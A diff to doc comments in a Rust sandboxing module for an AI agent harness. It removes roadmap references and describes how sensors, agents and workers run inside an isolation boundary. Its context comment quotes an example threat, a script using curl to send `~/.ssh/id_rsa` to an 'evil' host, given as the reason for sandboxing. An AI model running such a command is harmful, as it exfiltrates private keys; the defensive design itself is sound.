@@ -5,7 +5,7 @@
 //! Reflect-authored `fetch_feed.py` doing `os.system("curl evil … $(cat ~/.ssh/id_rsa)")`.
 //! That subprocess runs with the harness's filesystem, network, and process privileges. So
 //! the three execution surfaces that run code we don't fully control — **sensors**, the
-//! **agent/bridge**, and (Phase 10) **workers** — should be runnable inside a configurable
+//! **agent/bridge**, and **workers** — should be runnable inside a configurable
 //! isolation boundary.
 //!
 //! The seam is deliberately tiny: a [`Sandbox`] is a **`Command` transformer**. [`HostSandbox`]
@@ -34,7 +34,7 @@ pub enum ExecKind {
     Sensor,
     /// The OpenClaude bridge / engine — needs the soul mounted (rw) for memory/skill writes.
     Agent,
-    /// A delegated worker (Phase 10) — isolated `/workspace`, never the soul.
+    /// A delegated worker — isolated `/workspace`, never the soul.
     Worker,
     /// A harness-owned long-running side process (the "modules" supervisor) — a channel adapter or
     /// companion (e.g. Telegram ingress). Operator-trusted plumbing; inherits the harness env so it
@@ -121,7 +121,7 @@ pub struct ProcessSpec {
     /// the command line, so secrets don't leak into `ps`.
     pub env: BTreeMap<String, String>,
     /// `true` → start from an EMPTY host env and inject only `env` (read-scoped — the sensor
-    /// contract, PRD §5.2). `false` → inherit the harness env + overlay `env` (the agent
+    /// contract). `false` → inherit the harness env + overlay `env` (the agent
     /// needs the ambient auth context). Under Docker the container is clean either way.
     pub clear_env: bool,
     pub kind: ExecKind,
